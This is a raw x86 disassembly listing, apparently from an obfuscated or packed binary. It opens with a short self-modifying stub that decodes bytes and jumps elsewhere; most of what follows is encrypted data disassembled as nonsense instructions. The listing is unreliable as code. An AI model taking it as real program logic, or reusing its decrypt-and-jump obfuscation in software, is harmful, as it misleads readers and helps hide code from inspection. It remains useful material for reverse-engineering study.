  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fcomp  QWORD PTR fs:[eax-0x2265e637]
  40389e:	pop    edi
  40389f:	bound  esp,QWORD PTR [edx-0x23]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx+0x6c]
  4038a6:	retf   
  4038a7:	addr16 loope 0x403894
  4038aa:	adc    ah,bh
  4038ac:	mov    ah,0x87
  4038ae:	xor    eax,0x32e029f2
  4038b3:	loop   0x403869
  4038b5:	add    esi,DWORD PTR [ecx]
  4038b7:	fdiv   QWORD PTR [ebp-0x6975096f]
  4038bd:	iret   
  4038be:	xchg   DWORD PTR [edx],ebp
  4038c0:	pop    esi
  4038c1:	jne    0x40385a
  4038c3:	lods   eax,DWORD PTR ds:[esi]
  4038c4:	sub    al,BYTE PTR [ebx]
  4038c6:	mov    eax,0x37f2a5c4
  4038cb:	xchg   ebp,eax
  4038cc:	mov    edx,0x4b16259
  4038d1:	fs xchg ecx,eax
  4038d3:	mov    cl,0x3f
  4038d5:	inc    ebx
  4038d6:	je     0x403899
  4038d8:	push   eax
  4038d9:	bound  ebp,QWORD PTR [esi+0x7ea6553]
  4038df:	inc    edi
  4038e0:	push   eax
  4038e1:	cmp    al,0xe
  4038e3:	push   ecx
  4038e4:	scas   al,BYTE PTR es:[edi]
  4038e5:	test   DWORD PTR [ebx+ecx*4+0x794c4ee0],eax
  4038ec:	xlat   BYTE PTR ds:[ebx]
  4038ed:	jl     0x403910
  4038ef:	pop    esi
  4038f0:	shl    BYTE PTR [edx+0xe720160],0x21
  4038f7:	inc    eax
  4038f8:	mov    DWORD PTR ss:0xea462b64,esi
  4038ff:	mov    bl,0xdf
  403901:	stc    
  403902:	arpl   WORD PTR [ecx-0x75],bx
  403905:	(bad)  
  403906:	cld    
  403907:	xchg   esp,eax
  403908:	xor    edi,DWORD PTR [ebx+0x52d687c0]
  40390e:	xchg   edx,eax
  40390f:	in     eax,dx
  403910:	mov    ebp,0xf5b6bc04
  403915:	imul   esp,DWORD PTR [edx+0x616a18da],0xffffff94
  40391c:	imul   ebx,DWORD PTR [ebx-0x12],0xffffffa6
  403920:	out    dx,eax
  403921:	idiv   DWORD PTR [esi-0x32]
  403924:	test   al,0x1d
  403926:	fnstcw WORD PTR [ebp-0x7d7d4801]
  40392c:	add    eax,0x7ca264eb
  403931:	mov    ch,0x9c
  403933:	mov    ecx,0x89b65d1
  403938:	adc    DWORD PTR [ecx-0x74],ebx
  40393b:	lods   al,BYTE PTR ds:[esi]
  40393c:	xchg   DWORD PTR [ebx],edi
  40393e:	jb     0x403900
  403940:	aaa    
  403941:	cs push ds
  403943:	jle    0x4038c8
  403945:	mov    esi,0xa400c461
  40394a:	and    al,0x3e
  40394c:	daa    
  40394d:	push   ds
  40394e:	out    dx,al
  40394f:	cmp    bl,BYTE PTR [eax-0x7a78e834]
  403955:	xchg   ebp,eax
  403956:	ins    DWORD PTR es:[edi],dx
  403957:	test   al,0x7d
  403959:	jmp    0x4039bb
  40395b:	jmp    0xd16868c0
  403960:	adc    BYTE PTR [ecx],bh
  403962:	push   esi
  403963:	or     edi,0x583b141c
  403969:	std    
  40396a:	xor    eax,0x68600f97
  40396f:	and    BYTE PTR [ebp+0x68f7df4],cl
  403975:	in     eax,0xd1
  403977:	xchg   ecx,eax
  403978:	mov    esi,0x8d624cf0
  40397d:	sti    
  40397e:	mov    DWORD PTR [edx+0x67],edi
  403981:	das    
  403982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403983:	cmp    DWORD PTR [ebp-0x4e],ebp
  403986:	hlt    
  403987:	sti    
  403988:	dec    ebx
  403989:	xor    eax,0xa1510d52
  40398e:	or     eax,0xace3b56c
  403993:	mov    eax,0x6a7cc16b
  403998:	(bad)  
  403999:	mov    dl,0xc1
  40399b:	push   eax
  40399c:	xor    al,0xfe
  40399e:	cld    
  40399f:	jnp    0x40393a
  4039a1:	fsubr  QWORD PTR ds:0xdf17468c
  4039a7:	(bad)  
  4039a8:	pop    edx
  4039a9:	add    eax,0x9e06a680
  4039ae:	and    al,0x57
  4039b0:	pusha  
  4039b1:	in     eax,dx
  4039b2:	pop    ebp
  4039b3:	sar    DWORD PTR [ebx],0x5d
  4039b6:	in     eax,dx
  4039b7:	test   DWORD PTR [ebx],ebx
  4039b9:	jg     0x403a35
  4039bb:	lea    edx,[edx+0x11]
  4039be:	test   BYTE PTR [ebx+ecx*1],cl
  4039c1:	popf   
  4039c2:	inc    edx
  4039c3:	(bad)  
  4039c4:	push   esi
  4039c5:	es ss mov dh,0x76
  4039c9:	cvttps2pi mm3,xmm6
  4039cc:	xchg   DWORD PTR [ebp-0x6e],esp
  4039cf:	mov    DWORD PTR [ebx],ecx
  4039d1:	and    ch,0xa8
  4039d4:	cld    
  4039d5:	mov    BYTE PTR [ebp+0x1f1eb86f],ch
  4039db:	loop   0x403a21
  4039dd:	shl    BYTE PTR [ebx],0xbc
  4039e0:	pop    ebp
  4039e1:	mov    esi,0xa0dd20cc
  4039e6:	ror    BYTE PTR [edx+0x43],cl
  4039e9:	nop
  4039ea:	and    ecx,esi
  4039ec:	jo     0x403971
  4039ee:	pop    edi
  4039ef:	and    ebx,edi
  4039f1:	jge    0x40399b
  4039f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039f4:	imul   edi,esi,0x6e
  4039f7:	loop   0x4039bd
  4039f9:	mov    ch,0x15
  4039fb:	test   eax,0xed36a63d
  403a00:	xchg   edi,eax
  403a01:	add    DWORD PTR [ecx+ebp*2+0xa],esp
  403a05:	sbb    al,0x89
  403a07:	push   cs
  403a08:	sbb    eax,0x5d656133
  403a0d:	pop    ds
  403a0e:	cmp    eax,0xf69d573a
  403a13:	cmova  ecx,DWORD PTR [edi+0x66]
  403a17:	mov    dh,0x22
  403a19:	fcomp  st(1)
  403a1b:	jl     0x403a6a
  403a1d:	or     dl,ah
  403a1f:	add    eax,0xa7fbeeac
  403a24:	scas   al,BYTE PTR es:[edi]
  403a25:	push   es
  403a26:	jmp    0xe861f48f
  403a2b:	jnp    0x4039e8
  403a2d:	data16 daa 
  403a2f:	push   0xffffffaf
  403a31:	sbb    ch,BYTE PTR ds:0x26ee2040
  403a37:	outs   dx,BYTE PTR ds:[esi]
  403a38:	mov    edx,0x9242a6a7
  403a3d:	push   0x6d67fbac
  403a42:	int3   
  403a43:	or     al,0x15
  403a45:	addr16 js 0x4039f8
  403a48:	arpl   WORD PTR [edi+0x35875099],dx
  403a4e:	or     ebx,eax
  403a50:	xchg   DWORD PTR [esi+ebx*4],ebx
  403a53:	and    eax,DWORD PTR [esi+0x12425239]
  403a59:	sbb    eax,esp
  403a5b:	and    esi,DWORD PTR [ecx-0x69bcac37]
  403a61:	outs   dx,BYTE PTR ds:[esi]
  403a62:	ins    BYTE PTR es:[edi],dx
  403a63:	clc    
  403a64:	add    DWORD PTR [edi],esi
  403a66:	fild   QWORD PTR [edi+0x29]
  403a69:	popa   
  403a6a:	mov    al,ds:0x96b89c6b
  403a6f:	ret    0xeeb4
  403a72:	sub    al,0x1e
  403a74:	adc    dh,BYTE PTR [esi+0x68b2b6f0]
  403a7a:	jmp    0x79862fee
  403a7f:	cmp    BYTE PTR [edi+edx*4+0x36],bh
  403a83:	xchg   esi,eax
  403a84:	sti    
  403a85:	mov    esp,0x21b32471
  403a8a:	popf   
  403a8b:	xchg   ebx,eax
  403a8c:	push   ss
  403a8d:	push   cs
  403a8e:	ucomiss xmm5,DWORD PTR [ebx-0x14]
  403a92:	sbb    eax,0xf196dcc1
  403a97:	shl    DWORD PTR [edi-0x1b],1
  403a9a:	mov    dh,0x9d
  403a9c:	jb     0x403ae0
  403a9e:	imul   edx,DWORD PTR [edx-0xe],0x8c3b8b26
  403aa5:	mov    esp,0xc190fdbc
  403aaa:	int3   
  403aab:	div    cl
  403aad:	pop    edi
  403aae:	shr    edx,0xe0
  403ab1:	test   eax,0xe2178262
  403ab6:	les    esi,FWORD PTR [ebx]
  403ab8:	out    0x11,al
  403aba:	dec    esp
  403abb:	and    bl,BYTE PTR [ebx+0x1447b50a]
  403ac1:	daa    
  403ac2:	mov    ds:0xe37eca0f,eax
  403ac7:	cmp    eax,0xc4b8d6a2
  403acc:	sbb    dh,BYTE PTR [ecx]
  403ace:	sbb    BYTE PTR [ecx+0x31],dl
  403ad1:	mov    dh,0xe5
  403ad3:	data16 jno 0x403ab1
  403ad6:	cs dec ecx
  403ad8:	stc    
  403ad9:	fild   WORD PTR [esi+0x17]
  403adc:	call   0xe225:0x6dea31a4
  403ae3:	push   edx
  403ae4:	popf   
  403ae5:	or     BYTE PTR [edi+0x2458168e],al
  403aeb:	imul   ecx,ebx,0xffffffb4
  403aee:	das    
  403aef:	sub    eax,0x4bbf32a8
  403af4:	jmp    0x4fb:0x5c16be2e
  403afb:	and    eax,0xb3abf2fa
  403b00:	gs out dx,eax
  403b02:	icebp  
  403b03:	test   eax,0x17d0ac64
  403b08:	imul   esp,DWORD PTR [edx+0x1a],0x1a
  403b0c:	mov    edx,0xa88c3032
  403b11:	pushf  
  403b12:	pop    eax
  403b13:	sub    eax,ebp
  403b15:	into   
  403b16:	lock inc ecx
  403b18:	dec    edx
  403b19:	imul   edi,DWORD PTR [esi+0xd668de3],0x7c3c4184
  403b23:	aad    0x1a
  403b25:	iret   
  403b26:	cmp    al,0x66
  403b28:	mov    esi,0x3554bcba
  403b2d:	add    al,0xad
  403b2f:	out    0x37,al
  403b31:	pop    ebx
  403b32:	(bad)  
  403b33:	sar    BYTE PTR [edx+0x33e39f47],1
  403b39:	test   al,0x70
  403b3b:	cdq    
  403b3c:	cmp    dh,BYTE PTR [edi+0x23766a80]
  403b42:	jb     0x403aed
  403b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b45:	stc    
  403b46:	int    0xa8
  403b48:	and    edi,DWORD PTR [ebp-0x4a]
  403b4b:	in     eax,0xa5
  403b4d:	shl    BYTE PTR [ecx+0x4c],0x77
  403b51:	inc    esp
  403b52:	ins    BYTE PTR es:[edi],dx
  403b53:	pop    eax
  403b54:	mov    ah,ah
  403b56:	imul   ebp,ebx,0xf399d9e3
  403b5c:	daa    
  403b5d:	inc    ebx
  403b5e:	jl     0x403af2
  403b60:	into   
  403b61:	sti    
  403b62:	sbb    BYTE PTR [eax+ecx*1+0x42],cl
  403b66:	js     0x403ba1
  403b68:	mov    ah,0x9b
  403b6a:	iret   
  403b6b:	mov    dl,0x3a
  403b6d:	int3   
  403b6e:	inc    eax
  403b6f:	hlt    
  403b70:	mov    BYTE PTR [esi+edi*8+0x5f],dh
  403b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b75:	outs   dx,DWORD PTR ds:[esi]
  403b76:	dec    eax
  403b77:	daa    
  403b78:	xor    BYTE PTR [ebx-0x29],dh
  403b7b:	popa   
  403b7c:	call   0xeec2:0x90ce7913
  403b83:	rol    BYTE PTR [edi],0xf
  403b86:	push   esi
  403b87:	mov    bl,0x83
  403b89:	aad    0xd1
  403b8b:	stos   BYTE PTR es:[edi],al
  403b8c:	loope  0x403b8c
  403b8e:	jo     0x403b79
  403b90:	pop    ebx
  403b91:	jmp    0x74a1:0xead723d0
  403b98:	hlt    
  403b99:	push   ebp
  403b9a:	or     DWORD PTR [ebx-0x35813435],edx
  403ba0:	jg     0x403c04
  403ba2:	fstp   QWORD PTR [edx]
  403ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ba5:	rcr    BYTE PTR [esi+0x10],1
  403ba8:	shl    bh,0xd9
  403bab:	adc    ecx,esp
  403bad:	in     eax,0x37
  403baf:	cmp    edi,DWORD PTR ds:0x59312459
  403bb5:	iret   
  403bb6:	outs   dx,DWORD PTR ds:[esi]
  403bb7:	loope  0x403b4d
  403bb9:	popa   
  403bba:	sti    
  403bbb:	cld    
  403bbc:	jns    0x403bce
  403bbe:	loopne 0x403b67
  403bc0:	jmp    0x5c8fc6b9
  403bc5:	push   ds
  403bc6:	das    
  403bc7:	jmp    0xffe5:0x898a1a6
  403bce:	adc    BYTE PTR [ecx-0x4c65e48a],ah
  403bd4:	shl    BYTE PTR [ebp-0x1d],1
  403bd7:	push   ds
  403bd8:	data16 sar BYTE PTR [eax+0x1b],0x63
  403bdd:	dec    esi
  403bde:	add    eax,0x10dec5ae
  403be3:	enter  0xe157,0x46
  403be7:	int3   
  403be8:	icebp  
  403be9:	sub    DWORD PTR [ecx+ebp*8-0x735ba190],ecx
  403bf0:	pop    esi
  403bf1:	dec    edx
  403bf2:	mov    bl,0xd3
  403bf4:	lahf   
  403bf5:	je     0x403c0e
  403bf7:	sbb    al,0x68
  403bf9:	jle    0x403b8b
  403bfb:	into   
  403bfc:	or     DWORD PTR [ebx],edx
  403bfe:	stos   DWORD PTR es:[edi],eax
  403bff:	in     eax,0xe9
  403c01:	(bad)  
  403c02:	cwde   
  403c03:	mov    fs,WORD PTR [ebp+0x347452eb]
  403c09:	enter  0x91c2,0xd7
  403c0d:	mov    cs,WORD PTR [ebx-0x2f]
  403c10:	cmp    ah,al
  403c12:	pop    ebp
  403c13:	push   esi
  403c14:	nop
  403c15:	add    eax,0x62417ca9
  403c1a:	(bad)  
  403c1b:	sub    dh,BYTE PTR [edi-0xd]
  403c1e:	sbb    eax,0xe2fbc166
  403c23:	ja     0x403c29
  403c25:	push   edi
  403c26:	dec    edx
  403c27:	loopne 0x403c48
  403c29:	jp     0x403bb3
  403c2b:	xchg   ch,al
  403c2d:	lods   al,BYTE PTR ds:[esi]
  403c2e:	in     eax,0xed
  403c30:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  403c32:	jl     0x403c1f
  403c34:	push   0x54e42905
  403c39:	xor    BYTE PTR [edx],al
  403c3b:	stc    
  403c3c:	lsl    edi,WORD PTR [eax-0x27]
  403c40:	cli    
  403c41:	mov    eax,ds:0x9e749a65
  403c46:	ficom  WORD PTR [eax-0x12c9f786]
  403c4c:	(bad)  
  403c4d:	mov    bl,0x38
  403c4f:	and    dl,dl
  403c51:	fst    DWORD PTR [ecx+ebx*4+0x6be8a3]
  403c58:	add    al,0xce
  403c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c5b:	fstp   TBYTE PTR [ebp-0x6]
  403c5e:	mov    esp,0xd0309b6e
  403c63:	jg     0x403c92
  403c65:	popa   
  403c66:	cmp    eax,DWORD PTR [ebp-0x52f30aff]
  403c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c6d:	jle    0x403c9d
  403c6f:	jns    0x403ca6
  403c71:	sbb    BYTE PTR [edx],dl
  403c73:	sub    DWORD PTR [esi+0x47e0742f],0xe66fbe58
  403c7d:	pushf  
  403c7e:	push   cs
  403c7f:	lods   al,BYTE PTR ds:[esi]
  403c80:	push   0x1656ed33
  403c85:	sbb    ebp,ebp
  403c87:	sbb    eax,0xb34434c8
  403c8c:	xor    esp,DWORD PTR ds:0xbb707f22
  403c92:	fwait
  403c93:	pop    esp
  403c94:	mov    bh,0x79
  403c96:	adc    BYTE PTR [eax+0x102905ec],dh
  403c9c:	push   esi
  403c9d:	pop    edx
  403c9e:	leave  
  403c9f:	xchg   edx,eax
  403ca0:	jp     0x403c68
  403ca2:	and    DWORD PTR [edi+0x541adade],ebp
  403ca8:	neg    DWORD PTR [eax]
  403caa:	cmp    BYTE PTR [edx-0x47],ch
  403cad:	sbb    edi,DWORD PTR [eax-0x73]
  403cb0:	or     BYTE PTR [edi-0x70],0x6f
  403cb4:	neg    BYTE PTR [esi-0x76153a0d]
  403cba:	push   cs
  403cbb:	neg    BYTE PTR [esi]
  403cbd:	jge    0x403c5b
  403cbf:	push   ss
  403cc0:	xor    dh,ch
  403cc2:	inc    ebx
  403cc3:	jge    0x403d01
  403cc5:	and    eax,0xff5057b
  403ccb:	push   es
  403ccc:	push   ebp
  403ccd:	add    DWORD PTR [edi+0x3ce35481],esi
  403cd3:	pop    edx
  403cd4:	mov    ds:0x39dfae4,eax
  403cd9:	push   edi
  403cda:	dec    esp
  403cdb:	in     al,dx
  403cdc:	nop
  403cdd:	jbe    0x403ced
  403cdf:	jb     0x403d23
  403ce1:	loop   0x403c88
  403ce3:	pop    es
  403ce4:	into   
  403ce5:	retf   0x5348
  403ce8:	fwait
  403ce9:	imul   ecx,DWORD PTR [eax],0x16
  403cec:	add    DWORD PTR [ecx],eax
  403cee:	aam    0xe3
  403cf0:	cld    
  403cf1:	jne    0x403d30
  403cf3:	or     al,0x5d
  403cf5:	gs stc 
  403cf7:	(bad)  
  403cf8:	retf   
  403cf9:	stc    
  403cfa:	in     eax,dx
  403cfb:	adc    DWORD PTR [eax-0x500934fe],edi
  403d01:	outs   dx,BYTE PTR ds:[esi]
  403d02:	jl     0x403d45
  403d04:	int    0xfb
  403d06:	seta   BYTE PTR [esi]
  403d09:	adc    BYTE PTR [ecx-0x2bd72e4f],cl
  403d0f:	lock xchg ebp,eax
  403d11:	iret   
  403d12:	ins    DWORD PTR es:[edi],dx
  403d13:	xchg   DWORD PTR [ebx+0x406b2ad2],esi
  403d19:	fs enter 0x2564,0xd1
  403d1e:	in     eax,0xc7
  403d20:	pop    edx
  403d21:	fcom   DWORD PTR [edi+0xfc863f2]
  403d27:	jne    0x403ca9
  403d29:	les    esi,FWORD PTR [ecx-0x48]
  403d2c:	mov    edi,0xaf3e444c
  403d31:	arpl   WORD PTR [eax-0x4c],bx
  403d34:	dec    ebp
  403d36:	cmp    eax,0x42c67491
  403d3b:	enter  0xd5dd,0x57
  403d3f:	mov    bl,0x9e
  403d41:	push   cs
  403d42:	mov    WORD PTR [esi-0x374f256c],ss
  403d48:	icebp  
  403d49:	pop    eax
  403d4a:	jne    0x403cd8
  403d4c:	lods   eax,DWORD PTR ds:[esi]
  403d4d:	out    dx,al
  403d4e:	nop
  403d4f:	mov    bl,0x85
  403d51:	leave  
  403d52:	shl    BYTE PTR [eax+esi*8-0x5a],0x87
  403d57:	mov    eax,0x384464f3
  403d5d:	daa    
  403d5e:	loopne 0x403d75
  403d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d61:	push   0xffffff8d
  403d63:	xchg   DWORD PTR [eax],esp
  403d65:	sar    DWORD PTR [ecx-0x7fac2b2b],0x8
  403d6c:	aaa    
  403d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d6e:	clc    
  403d6f:	jl     0x403d61
  403d71:	pop    edx
  403d72:	mov    al,ds:0xf1fa6414
  403d77:	mov    cl,0x94
  403d79:	cmp    BYTE PTR [ebx-0x11],0x91
  403d7d:	lds    esi,FWORD PTR [ebp+0x145f1661]
  403d83:	mov    ebp,0x9748b75e
  403d88:	aaa    
  403d89:	les    edi,FWORD PTR fs:[ecx+ecx*4]
  403d8d:	jno    0x403d9a
  403d8f:	ja     0x403d15
  403d91:	or     DWORD PTR [ebx-0x46],edx
  403d94:	sub    ecx,ebx
  403d96:	arpl   WORD PTR [edx+0x651780ee],bx
  403d9c:	js     0x403d5a
  403d9e:	sub    DWORD PTR [edi],edx
  403da0:	dec    ebp
  403da1:	aaa    
  403da2:	mov    edx,0x9d9b26da
  403da7:	idiv   BYTE PTR [ecx]
  403da9:	loope  0x403d7c
  403dab:	out    dx,al
  403dac:	in     eax,0x26
  403dae:	inc    BYTE PTR [edi-0x37b4b7e3]
  403db4:	push   0x4a
  403db6:	adc    DWORD PTR [edi],esp
  403db8:	movd   mm3,DWORD PTR fs:[edx+0x34f1876f]
  403dc0:	loop   0x403df3
  403dc2:	dec    eax
  403dc3:	xchg   ebx,eax
  403dc4:	mov    ch,dl
  403dc6:	and    esi,DWORD PTR [ebp-0x3c7b52b]
  403dcc:	fld    DWORD PTR [edx+0x2cbd24cc]
  403dd2:	push   cs
  403dd3:	mov    dh,cl
  403dd5:	aam    0x25
  403dd7:	jb     0x403e3e
  403dd9:	cmp    cl,ch
  403ddb:	sub    ebp,0x3e
  403dde:	cmp    edi,0xffffff9a
  403de1:	repz or eax,0x2c04a10d
  403de7:	aad    0xdb
  403de9:	mov    ds:0x3a9e635c,eax
  403dee:	push   0xffffff94
  403df0:	adc    eax,0x9cf9e7af
  403df5:	mov    ds:0xab72586f,al
  403dfa:	xchg   edi,eax
  403dfb:	dec    eax
  403dfc:	mov    bh,0xda
  403dfe:	(bad)  
  403dff:	fst    st(1)
  403e01:	pop    es
  403e02:	jle    0x403e42
  403e04:	push   edi
  403e05:	xlat   BYTE PTR ds:[ebx]
  403e06:	js     0x403de4
  403e08:	pop    ebp
  403e09:	fcomp  DWORD PTR [ebx-0x2d]
  403e0c:	outs   dx,BYTE PTR ds:[esi]
  403e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e0e:	jmp    FWORD PTR [ebx]
  403e10:	aas    
  403e11:	(bad)  
  403e12:	aaa    
  403e13:	jmp    0x9077484d
  403e18:	push   edx
  403e19:	hlt    
  403e1a:	cs dec esp
  403e1c:	dec    esi
  403e1d:	je     0x403e53
  403e1f:	mov    edi,0x149a92df
  403e24:	stos   DWORD PTR es:[edi],eax
  403e25:	or     eax,0xf8ddef14
  403e2a:	mov    DWORD PTR [esi-0x20],ecx
  403e2d:	sbb    ebx,DWORD PTR [ecx+0x46]
  403e30:	sub    eax,0xbe197ce0
  403e35:	mul    BYTE PTR [eax+0x70d68875]
  403e3b:	enter  0xaf91,0xb6
  403e3f:	pop    ss
  403e40:	or     dh,BYTE PTR [ecx+0x2466cd07]
  403e46:	sbb    al,0x13
  403e48:	xchg   esp,eax
  403e49:	lods   eax,DWORD PTR ds:[esi]
  403e4a:	pop    edx
  403e4b:	or     dl,BYTE PTR [edx+0x78c2fc55]
  403e51:	fdivp  st(0),st
  403e53:	push   edx
  403e54:	xchg   ecx,eax
  403e55:	xchg   esi,eax
  403e56:	pop    es
  403e57:	add    eax,0x3638dd99
  403e5c:	pushf  
  403e5d:	mov    al,0x3
  403e5f:	inc    esi
  403e60:	out    0x75,al
  403e62:	mov    ebx,0x31401d24
  403e67:	cmp    ebx,DWORD PTR [esi-0x48]
  403e6a:	ins    BYTE PTR es:[edi],dx
  403e6b:	cmp    eax,0x817575bd
  403e70:	mov    edx,0x2d2bd2a4
  403e75:	push   es
  403e76:	jge    0x403ebd
  403e78:	pop    ebp
  403e79:	call   0xbc632b19
  403e7e:	and    ebp,esp
  403e80:	pop    eax
  403e81:	jg     0x403e62
  403e83:	shr    al,cl
  403e85:	ja     0x403eb2
  403e87:	das    
  403e88:	ins    BYTE PTR es:[edi],dx
  403e89:	sub    ch,BYTE PTR [ebx+0x20952e9c]
  403e8f:	dec    ebx
  403e90:	push   eax
  403e91:	inc    ecx
  403e92:	fwait
  403e93:	mov    ds:0x40bf2a2d,eax
  403e98:	dec    edi
  403e99:	sub    DWORD PTR [ecx+0x5b532de4],edi
  403e9f:	push   ebp
  403ea0:	lods   al,BYTE PTR ds:[esi]
  403ea1:	icebp  
  403ea2:	bound  ebx,QWORD PTR [eax-0x6f618572]
  403ea8:	pop    eax
  403ea9:	sti    
  403eaa:	xor    esp,0x79
  403ead:	ins    BYTE PTR es:[edi],dx
  403eae:	pop    esp
  403eaf:	xchg   BYTE PTR [edi],dl
  403eb1:	mov    ds:0x5790e610,al
  403eb6:	(bad)  
  403eb7:	dec    esi
  403eb8:	jecxz  0x403e9d
  403eba:	clc    
  403ebb:	in     al,0xcd
  403ebd:	shl    DWORD PTR [ebp+ebp*4+0x3f12dee9],0x21
  403ec5:	(bad)  
  403ec6:	scas   eax,DWORD PTR es:[edi]
  403ec7:	sbb    cl,BYTE PTR [edi-0x4f3422e2]
  403ecd:	aam    0xbd
  403ecf:	mov    cl,0x61
  403ed1:	cmp    al,0xa9
  403ed3:	lahf   
  403ed4:	imul   edx,DWORD PTR [ecx-0x57a54cd3],0xfffffff0
  403edb:	sbb    eax,0x25008b4f
  403ee0:	loope  0x403eb2
  403ee2:	icebp  
  403ee3:	scas   eax,DWORD PTR es:[edi]
  403ee4:	(bad)  
  403ee5:	sub    esp,esp
  403ee7:	fisub  WORD PTR [eax-0x32]
  403eea:	mov    esi,0x8122bf4
  403eef:	(bad)  
  403ef0:	int    0x81
  403ef2:	retf   
  403ef3:	push   ecx
  403ef4:	ins    BYTE PTR es:[edi],dx
  403ef5:	test   bl,0x8e
  403ef8:	retf   0xf940
  403efb:	jle    0x403f6b
  403efd:	pusha  
  403efe:	jmp    0x32479cc1
  403f03:	add    eax,0x71377bed
  403f08:	repnz mov bl,0x8b
  403f0b:	adc    DWORD PTR [ebp+0x17],ebp
  403f0e:	pop    esi
  403f0f:	adc    BYTE PTR [ecx-0x5b94c7d1],ah
  403f15:	fwait
  403f16:	dec    eax
  403f17:	rcl    ebx,1
  403f19:	(bad)  
  403f1b:	(bad)  
  403f1c:	in     al,dx
  403f1d:	sbb    bl,ah
  403f1f:	nop
  403f20:	(bad)  
  403f21:	jo     0x403f4b
  403f23:	add    DWORD PTR [ebx],ecx
  403f25:	or     eax,0x1642880b
  403f2a:	addr16 (bad) 
  403f2c:	pop    esi
  403f2d:	jle    0x403f98
  403f2f:	mov    ah,0xf9
  403f31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f32:	jbe    0x403ec8
  403f34:	jle    0x403f16
  403f36:	call   0xa817:0x7106c878
  403f3d:	jne    0x403f03
  403f3f:	ins    DWORD PTR es:[edi],dx
  403f40:	scas   al,BYTE PTR es:[edi]
  403f41:	sub    BYTE PTR [ebx],0x6b
  403f44:	out    dx,eax
  403f45:	push   esp
  403f46:	ror    DWORD PTR [esi+0x21],1
  403f49:	rcl    BYTE PTR [ecx],cl
  403f4b:	imul   edi,DWORD PTR [eax],0xffffffe1
  403f4e:	mov    ds:0xa0e813a,al
  403f53:	test   BYTE PTR [esi+0x6c],bl
  403f56:	rcr    BYTE PTR [ebx-0x264f083a],1
  403f5c:	and    DWORD PTR [ebp+0x69],ebp
  403f5f:	pop    es
  403f60:	test   BYTE PTR [ebx],0xa7
  403f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f64:	cli    
  403f65:	push   cs
  403f66:	clc    
  403f67:	inc    esi
  403f68:	ficom  WORD PTR [ebp-0x2b73bf94]
  403f6e:	xlat   BYTE PTR ds:[ebx]
  403f6f:	(bad)  
  403f70:	xor    BYTE PTR [ebx-0x63],cl
  403f73:	out    dx,al
  403f74:	test   DWORD PTR [esi],eax
  403f76:	and    DWORD PTR [ecx+edx*8],0x3b04ab2a
  403f7d:	sbb    BYTE PTR [edi+0x30545b26],dh
  403f83:	jae    0x403fd1
  403f85:	daa    
  403f86:	adc    ah,bl
  403f88:	test   BYTE PTR [esi-0x30],ah
  403f8b:	jmp    0x94a4:0x9cb360df
  403f92:	stc    
  403f93:	push   0x72
  403f95:	out    0x81,eax
  403f97:	mov    WORD PTR [edx-0x2612801e],ss
  403f9d:	jg     0x403ff9
  403f9f:	sbb    BYTE PTR [esp+edx*4],bl
  403fa2:	sbb    DWORD PTR [ebx],ebx
  403fa4:	pop    edi
  403fa5:	add    al,0x73
  403fa7:	pop    ss
  403fa8:	mov    WORD PTR [edx-0x24f9c375],es
  403fae:	inc    eax
  403faf:	repz cmp cl,bl
  403fb2:	sub    DWORD PTR [ebp-0x35e2cc5f],eax
  403fb8:	mov    ecx,0xf6e1ee50
  403fbd:	cdq    
  403fbe:	push   ss
  403fbf:	xchg   DWORD PTR [edx-0x3ac36ead],ebp
  403fc5:	mov    esi,DWORD PTR [ebx]
  403fc7:	mov    ch,0x9d
  403fc9:	pop    esi
  403fca:	int3   
  403fcb:	inc    edi
  403fcc:	mov    WORD PTR [eax],cs
  403fce:	mov    esp,0x51439fd0
  403fd3:	lods   eax,DWORD PTR ds:[esi]
  403fd4:	xor    DWORD PTR [edx+edx*4-0x23],edi
  403fd8:	pop    esp
  403fd9:	cwde   
  403fda:	sbb    edi,eax
  403fdc:	pop    ecx
  403fdd:	sbb    DWORD PTR [edi+0x12],ebx
  403fe0:	pop    ebp
  403fe1:	add    ch,al
  403fe3:	faddp  st(4),st
  403fe5:	xor    al,0xac
  403fe7:	xor    BYTE PTR [edx-0x1c6139d2],ch
  403fed:	aad    0xd5
  403fef:	xor    BYTE PTR [edx+eiz*2+0x4164ff2b],cl
  403ff6:	jmp    0x55b0:0xa4c3ab30
  403ffd:	fst    QWORD PTR [esi]
